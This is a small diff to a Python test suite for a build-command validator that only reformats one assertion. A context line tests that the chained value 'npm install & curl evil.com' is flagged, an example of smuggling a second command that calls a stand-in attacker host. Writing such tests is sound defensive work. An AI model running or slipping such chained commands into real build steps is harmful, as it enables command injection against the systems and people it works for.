@@ -1725,9 +1725,7 @@ class TestHasDisallowedBuildCommandContent:
         assert has_disallowed_build_command_content("npm install & curl evil.com")
 
     def test_double_ampersand_allowed(self) -> None:
-        assert not has_disallowed_build_command_content(
-            "npm install && npm run build"
-        )
+        assert not has_disallowed_build_command_content("npm install && npm run build")
 
     @pytest.mark.parametrize(
         "cmd",
